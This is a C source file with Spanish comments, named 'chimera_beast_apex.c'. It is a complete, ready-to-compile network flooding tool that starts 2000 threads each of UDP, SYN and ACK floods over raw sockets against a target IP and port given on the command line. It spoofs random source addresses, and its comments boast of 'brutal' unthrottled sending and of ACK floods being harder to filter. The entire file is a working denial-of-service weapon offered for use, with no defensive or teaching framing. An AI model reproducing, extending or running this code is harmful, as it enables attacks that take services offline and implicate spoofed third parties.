// chimera_beast_apex.c - El músculo de bajo nivel para floods de red brutales
// Compilar con: gcc -O3 -pthread chimera_beast_apex.c -o chimera_beast_apex

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096 // Tamaño de paquete aumentado para máxima carga

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
} attack_args;

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// Hilo de ataque UDP Flood optimizado para velocidad
void *udp_flood_thread(void *args) {
    attack_args *a = (attack_args *)args;
    struct sockaddr_in sin;
    int sd;
    char buffer[MAX_PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
    char *payload = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);
    int payload_size = MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr);

    time_t start_time = time(NULL);

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) pthread_exit(NULL);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->target_port);
    sin.sin_addr.s_addr = inet_addr(a->target_ip);

    // Pre-calcular cabeceras para optimizar el bucle
    memset(buffer, 0, MAX_PACKET_SIZE);
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->daddr = sin.sin_addr.s_addr;
    udp->dest = htons(a->target_port);
    udp->len = htons(sizeof(struct udphdr) + payload_size);

    // Llenar payload con datos aleatorios
    for (int i = 0; i < payload_size; ++i) {
        payload[i] = random() % 255;
    }

    // Bucle de envío brutal sin pausas
    while (time(NULL) - start_time < a->duration) {
        ip->saddr = random();
        ip->id = random();
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
        ip->check = 0;
        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));

        udp->source = htons(random() % 65535);
        udp->check = 0;
        
        if (sendto(sd, buffer, ntohs(ip->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            // No imprimir errores para no ralentizar el hilo
        }
    }
    close(sd);
    pthread_exit(NULL);
}

// Hilo de ataque SYN Flood optimizado
void *syn_flood_thread(void *args) {
    attack_args *a = (attack_args *)args;
    struct sockaddr_in sin;
    int sd;
    char buffer[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));

    time_t start_time = time(NULL);

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd < 0) pthread_exit(NULL);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->target_port);
    sin.sin_addr.s_addr = inet_addr(a->target_ip);

    memset(buffer, 0, sizeof(buffer));

    // Pre-calcular cabeceras
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->daddr = sin.sin_addr.s_addr;
    tcp->dest = htons(a->target_port);
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(65535);

    // Bucle de envío sin pausas
    while (time(NULL) - start_time < a->duration) {
        ip->saddr = random();
        ip->id = random();
        ip->tot_len = htons(sizeof(buffer));
        ip->check = 0;
        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));

        tcp->source = htons(random() % 65535);
        tcp->seq = htonl(random());
        tcp->check = 0;
        
        if (sendto(sd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            // No imprimir errores para no ralentizar el hilo
        }
    }
    close(sd);
    pthread_exit(NULL);
}

// Nuevo hilo de ataque ACK Flood (más difícil de filtrar que SYN)
void *ack_flood_thread(void *args) {
    attack_args *a = (attack_args *)args;
    struct sockaddr_in sin;
    int sd;
    char buffer[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));

    time_t start_time = time(NULL);

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd < 0) pthread_exit(NULL);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->target_port);
    sin.sin_addr.s_addr = inet_addr(a->target_ip);

    memset(buffer, 0, sizeof(buffer));

    // Pre-calcular cabeceras
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->daddr = sin.sin_addr.s_addr;
    tcp->dest = htons(a->target_port);
    tcp->doff = 5;
    tcp->ack = 1; // Flag ACK activado
    tcp->window = htons(65535);

    // Bucle de envío sin pausas
    while (time(NULL) - start_time < a->duration) {
        ip->saddr = random();
        ip->id = random();
        ip->tot_len = htons(sizeof(buffer));
        ip->check = 0;
        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));

        tcp->source = htons(random() % 65535);
        tcp->seq = htonl(random());
        tcp->ack_seq = htonl(random());
        tcp->check = 0;
        
        if (sendto(sd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            // No imprimir errores para no ralentizar el hilo
        }
    }
    close(sd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <IP> <PUERTO> <DURACION_SEGUNDOS>\n", argv[0]);
        exit(1);
    }
    char *target_ip = argv[1];
   int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = 2000; // Doblamos el número de hilos para cada tipo de ataque

    pthread_t udp_threads[num_threads];
    pthread_t syn_threads[num_threads];
    pthread_t ack_threads[num_threads]; // Nuevo hilo para ACK Flood
    attack_args args = {target_ip, target_port, duration};

    printf("[CHIMERA BEAST APEX] Iniciando ataque de bajo nivel en %s:%d por %d segundos\n", target_ip, target_port, duration);
    printf("[CHIMERA BEAST APEX] Desplegando %d hilos de UDP Flood, %d de SYN Flood y %d de ACK Flood...\n", num_threads, num_threads, num_threads);

    // Crear hilos de UDP Flood
    for (int i = 0; i < num_threads; ++i) {
        pthread_create(&udp_threads[i], NULL, udp_flood_thread, &args);
    }

    // Crear hilos de SYN Flood
    for (int i = 0; i < num_threads; ++i) {
        pthread_create(&syn_threads[i], NULL, syn_flood_thread, &args);
    }

    // Crear hilos de ACK Flood
    for (int i = 0; i < num_threads; ++i) {
        pthread_create(&ack_threads[i], NULL, ack_flood_thread, &args);
    }

    // Esperar a que todos los hilos terminen
    for (int i = 0; i < num_threads; ++i) {
        pthread_join(udp_threads[i], NULL);
        pthread_join(syn_threads[i], NULL);
        pthread_join(ack_threads[i], NULL);
    }

    printf("[CHIMERA BEAST APEX] Ataque de bajo nivel finalizado.\n");
    return 0;
}
